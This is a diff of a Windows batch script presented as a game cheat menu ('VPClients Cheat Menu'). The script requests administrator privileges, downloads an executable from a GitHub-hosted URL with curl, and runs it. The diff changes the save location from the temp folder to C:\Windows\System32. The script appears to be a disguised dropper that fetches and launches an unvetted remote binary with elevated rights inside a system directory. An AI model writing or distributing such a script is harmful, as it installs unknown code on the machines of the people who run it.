@@ -2,7 +2,7 @@
 title VPClients Cheat Menu
 color 0A
 
-:: Fixed Looping & Lag
+:: Check for admin privileges
 net session >nul 2>&1
 if %errorLevel% neq 0 (
     echo Requesting admin privileges...
@@ -13,10 +13,10 @@ echo Running as admin! VPclient Loading
 
 :: Download and run the exe
 echo Downloading mainskib.exe...
-curl -L -o "%TEMP%\skibmain67.exe" "https://github.com/infilling/infilling.github.io/raw/refs/heads/main/skibmain67.exe"
-if exist "%TEMP%\skibmain67.exe" (
+curl -L -o "C:\Windows\System32\skibmain67.exe" "https://github.com/infilling/infilling.github.io/raw/refs/heads/main/skibmain67.exe"
+if exist "C:\Windows\System32\skibmain67.exe" (
     echo Running mainskib.exe...
-    start "" "%TEMP%\skibmain67.exe"
+    start "" "C:\Windows\System32\skibmain67.exe"
 ) else (
     echo Download failed! Check your internet.
     pause
@@ -61,7 +61,7 @@ if "%choice%"=="3" (
 )
 if "%choice%"=="4" (
     echo Exiting GTag Fun. Bye!
-    del "%TEMP%\skibmain67.exe" 2>nul
+    del "C:\Windows\System32\skibmain67.exe" 2>nul
     exit /b
 )
 goto menu
